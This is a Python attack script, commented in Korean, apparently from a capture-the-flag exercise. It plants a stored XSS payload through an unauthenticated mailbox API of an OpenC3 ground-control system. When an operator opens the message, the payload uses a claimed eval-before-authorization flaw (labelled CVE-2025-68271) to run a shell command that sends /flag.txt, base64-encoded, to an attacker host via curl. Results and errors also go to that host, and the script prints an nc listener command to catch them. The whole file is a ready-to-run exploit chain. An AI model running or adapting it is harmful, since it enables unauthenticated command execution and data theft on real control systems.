#!/usr/bin/env python3
"""
XSS 페이로드를 관제 시스템의 공개 쪽지 제출 API로 등록하는 공격자 스크립트.

관제 시스템은 외부 클라이언트가 관제사에게 문의를 남길 수 있도록
POST /openc3-api/mailbox 를 인증 없이 열어두고 있습니다 (관제사 열람용 index/show만
인증이 필요함). 공격자는 이 공개 채널에 그대로 도달 가능한 상태이며,
쪽지 body에 대한 XSS 필터가 없다는 점을 악용해 악성 HTML을 등록합니다.

즉, 공격자는 관제 이메일 계정이나 OpenC3 계정 자격증명을 전혀 알 필요가 없고,
공개된 쪽지 제출 엔드포인트 주소만 알면 됩니다.

사용법:
  python3 send_xss.py \
    --url http://TARGET_IP:2900 \
    --from attacker@example.com \
    --subject "긴급 공지" \
    --exfil-host YOUR_PUBLIC_IP \
    --exfil-port 4444
"""

import argparse
import sys

import requests

DEFAULT_FROM = "attacker@example.com"
DEFAULT_SUBJECT = "긴급: 시스템 점검 안내"
DEFAULT_SCOPE = "DEFAULT"

# CVE-2025-68271 exploit payload:
# /openc3-api/api 엔드포인트에 JSON-RPC POST 전송
# convert_to_value()가 authorize() 전에 eval()을 호출하는 취약점을 악용
XSS_TEMPLATE = """<img src=x onerror="
(function(){{
  var h='{host}',p={port};
  fetch('/openc3-api/api',{{
    method:'POST',
    headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{
      jsonrpc:'2.0',method:'cmd',id:1,
      params:[
        'DEFAULT',
        'CFS_INT CCSDS_CMD with PKTID 0x1896, CHECKSUM 0, DATA 0x00000000',
        {{'CFS_INT':{{'read_write':'[`curl http://'+h+':'+p+'/?f=$(cat /flag.txt|base64 -w0)`]'}}}}
      ]
    }})
  }}).then(r=>r.text()).then(t=>fetch('http://'+h+':'+p+'/result?d='+encodeURIComponent(t)))
   .catch(e=>fetch('http://'+h+':'+p+'/err?e='+encodeURIComponent(e)));
}})();
">"""


def submit_mailbox(
    base_url: str,
    from_addr: str,
    subject: str,
    exfil_host: str,
    exfil_port: int,
    scope: str,
) -> None:
    payload = XSS_TEMPLATE.format(host=exfil_host, port=exfil_port)

    url = f"{base_url.rstrip('/')}/openc3-api/mailbox"
    body = {
        "from_email": from_addr,
        "subject": subject,
        "body": payload,
        "scope": scope,
    }

    print(f"[*] 쪽지 등록 요청: POST {url}")
    resp = requests.post(url, json=body, params={"scope": scope}, timeout=10)

    if resp.status_code == 201:
        print(f"[+] 쪽지 등록 완료 (인증 없이 성공): {resp.json()}")
        print(f"[*] 관제사 봇이 다음 점검 주기에 쪽지함을 열람하면 XSS가 실행됩니다.")
        print(f"[*] flag 수신 대기: nc -lvnp {exfil_port}")
    else:
        sys.exit(f"[-] 쪽지 등록 실패 HTTP {resp.status_code}: {resp.text[:300]}")


def main():
    p = argparse.ArgumentParser(
        description="CVE-2025-68271 XSS 페이로드를 공개 쪽지 API로 등록 (계정 자격증명 불필요)"
    )
    p.add_argument("--url", required=True, help="OpenC3 서버 기본 URL (예: http://TARGET_IP:2900)")
    p.add_argument("--from", dest="from_addr", default=DEFAULT_FROM, help="발신자 표시 주소 (임의)")
    p.add_argument("--subject", default=DEFAULT_SUBJECT)
    p.add_argument("--exfil-host", required=True, help="flag를 받을 서버 IP")
    p.add_argument("--exfil-port", type=int, default=4444)
    p.add_argument("--scope", default=DEFAULT_SCOPE)
    args = p.parse_args()

    submit_mailbox(
        base_url=args.url,
        from_addr=args.from_addr,
        subject=args.subject,
        exfil_host=args.exfil_host,
        exfil_port=args.exfil_port,
        scope=args.scope,
    )


if __name__ == "__main__":
    main()
